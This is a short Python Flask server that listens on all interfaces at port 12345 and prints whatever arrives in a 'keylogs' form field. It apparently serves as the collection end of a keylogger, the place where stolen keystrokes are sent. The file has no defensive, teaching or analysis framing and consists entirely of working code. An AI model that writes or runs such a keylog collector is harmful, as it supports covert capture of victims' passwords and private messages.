from flask import Flask, request

app = Flask(__name__)

@app.route('/endpoint', methods=['POST'])
def handle_keylogs():
    keylogs = request.form.get('keylogs')
    if keylogs:
        print(f"Received keylogs: {keylogs}")
    return 'OK', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=12345) # This will run the server on all interfaces on port 12345
